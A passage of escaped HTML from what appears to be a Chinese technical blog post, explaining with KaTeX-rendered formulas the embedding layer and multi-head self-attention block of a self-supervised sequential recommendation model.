class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 有关，该式为在模型参数为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>θ</mi></mrow><annotation encoding=\"application/x-tex\">\\theta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span></span></span></span> 的情况下<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 在条件<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 下的概率分布函数。</p>\n<h2 id=\"方法\"><a class=\"anchor\" href=\"#方法\">#</a> 方法</h2>\n<ul>\n<li>结合几个精心设计的自监督学习目标来增强原始模型</li>\n<li>利用输入的内在特征中反映的有效相关信号</li>\n<li>考虑不同粒度级别的信息，包括属性、项目、段（即子序列）和序列，它们被视为输入的不同视图</li>\n<li>通过堆叠嵌入层、自注意力块和预测层来开发顺序推荐模型的基本框架。</li>\n</ul>\n<h3 id=\"嵌入层\"><a class=\"anchor\" href=\"#嵌入层\">#</a> 嵌入层</h3>\n<ul k\\times=\"\" d=\"\">\n<li>在嵌入映射阶段维护一个项目嵌入矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi mathvariant=\"bold\">M</mi><mi>I</mi></msub><mo>∈</mo><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi mathvariant=\"normal\">∣</mi><mi>I</mi><mi mathvariant=\"normal\">∣</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">\\mathbf{M}_{I}\\in\\mathbb{R}^{|I|\\times d}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83611em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">M</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8879999999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mtight\">∣</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span></span></span></span> 和一个属性嵌入矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi mathvariant=\"bold\">M</mi><mi>A</mi></msub><mo><mover><mo><mo>∈</mo></mo><mrow></mrow></mover></mo><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi mathvariant=\"normal\">∣</mi><mi mathvariant=\"script\">A</mi><mi mathvariant=\"normal\">∣</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">\\mathbf{M}_{A}\\stackrel{}{\\in}\\mathbb{R}^{|\\mathcal{A}|\\times d}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9891000000000001em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">M</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">A</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8391000000000001em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">∈</span></span></span><span style=\"top:-3.7391em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.0391em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8879999999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mtight\"><span class=\"mord mathcal mtight\">A</span></span><span class=\"mord mtight\">∣</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span></span></span></span></li>\n<li n\\times=\"\" d=\"\">当给定一个长度为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 的序列时，在<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>M</mi><mi>I</mi></msub></mrow><annotation encoding=\"application/x-tex\">M_I</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 上应用查找操作来形成输入嵌入矩阵E{\\in}\\mathbb{R}^</li>\n<li>引入可学习的位置编码矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi><mo lspace=\"0em\" rspace=\"0em\">∈</mo><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi>n</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">P{\\in}\\mathbb{R}^{n\\times d}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8882079999999999em;vertical-align:-0.0391em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\"><span class=\"mrel\">∈</span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8491079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span></span></span></span> 来增强项目序列的输入表示</li>\n<li>基于此，序列表示<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>E</mi><mi>I</mi></msub><mo lspace=\"0em\" rspace=\"0em\">∈</mo><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi>n</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">E_I{\\in}\\mathbb{R}^{n\\times d}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9991079999999999em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mrel\">∈</span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8491079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span></span></span></span> 可以表示为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>E</mi><mi>I</mi></msub><mo>=</mo><mi>E</mi><mo>+</mo><mi>P</mi></mrow><annotation encoding=\"application/x-tex\">E_I=E+P</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span></span></span></span></li>\n<li>由于任务利用了辅助上下文数据，我们还需要从整个属性嵌入矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>M</mi><mi>A</mi></msub></mrow><annotation encoding=\"application/x-tex\">M_A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">A</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 中为每个项目形成一个嵌入矩阵E_A{\\in}\\mathbb{R}^</li>\n</ul>\n<h3 id=\"自注意力块\"><a class=\"anchor\" href=\"#自注意力块\">#</a> 自注意力块</h3>\n<ul>\n<li>\n<p>在嵌入层的基础上通过堆叠多个自注意力块来开发项目编码器。</p>\n</li>\n<li>\n<p>自注意力块通常由两个子层组成 —— 多头自注意力层和逐点前馈网络</p>\n</li>\n<li>\n<p>采用多头自注意力机制，可以有效地从不同的表示子空间中选择性地提取信息，定义如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow><mi mathvariant=\"normal\">M</mi><mi mathvariant=\"normal\">u</mi><mi mathvariant=\"normal\">l</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">i</mi><mi mathvariant=\"normal\">H</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">d</mi><mi mathvariant=\"normal\">A</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">n</mi></mrow><mo stretchy=\"false\">(</mo><msup><mi mathvariant=\"bold\">F</mi><mi>l</mi></msup><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mo stretchy=\"false\">[</mo><mi>h</mi><mi>e</mi><mi>a</mi><msub><mi>d</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><mi>h</mi><mi>e</mi><mi>a</mi><msub><mi>d</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><mi>h</mi><mi>e</mi><mi>a</mi><msub><mi>d</mi><mi>h</mi></msub><mo stretchy=\"false\">]</mo><msup><mi mathvariant=\"bold\">W</mi><mi>O</mi></msup><mo separator=\"true\">,</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mi>h</mi><mi>e</mi><mi>a</mi><msub><mi>d</mi><mi>i</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mrow><mi mathvariant=\"normal\">A</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">n</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">i</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">n</mi></mrow><mo stretchy=\"false\">(</mo><msup><mi mathvariant=\"bold\">F</mi><mi>l</mi></msup><msubsup><mi mathvariant=\"bold\">W</mi><mi>i</mi><mi>Q</mi></msubsup><mo separator=\"true\">,</mo><msup><mi mathvariant=\"bold\">F</mi><mi>l</mi></msup><msubsup><mi mathvariant=\"bold\">W</mi><mi>i</mi><mi>K</mi></msubsup><mo separator=\"true\">,</mo><msup><mi mathvariant=\"bold\">F</mi><mi>l</mi></msup><msubsup><mi mathvariant=\"bold\">W</mi><mi>i</mi><mi>V</mi></msubsup><mo stretchy=\"false\">)</mo><mo separator=\"true\">,</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n\\mathrm{MultiHeadAttn}(\\mathbf{F}^{l})&amp; =[head_{1},head_{2},...,head_{h}]\\mathbf{W}^{O}, \\\\\nhead_{i}&amp; =\\mathrm{Attention}(\\mathbf{F}^{l}\\mathbf{W}_{i}^{Q},\\mathbf{F}^{l}\\mathbf{W}_{i}^{K},\\mathbf{F}^{l}\\mathbf{W}_{i}^{V}), \n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.178347em;vertical-align:-1.3391734999999998em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8391735000000002em;\"><span style=\"top:-3.9400655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathrm\">M</span><span class=\"mord mathrm\">u</span><span class=\"mord mathrm\">l</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">i</span><span class=\"mord mathrm\">H</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\">d</span><span class=\"mord mathrm\">A</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">n</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span><span style=\"top:-2.3208265000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.3391734999999998em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8391735000000002em;\"><span style=\"top:-3.9400655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">h</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">O</span></span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span></span></span><span style=\"top:-2.3208265000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">A</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">n</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">i</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">n</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9592389999999998em;\"><span style=\"top:-2.4231360000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span style=\"top:-3.180908em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">Q</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.276864em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span 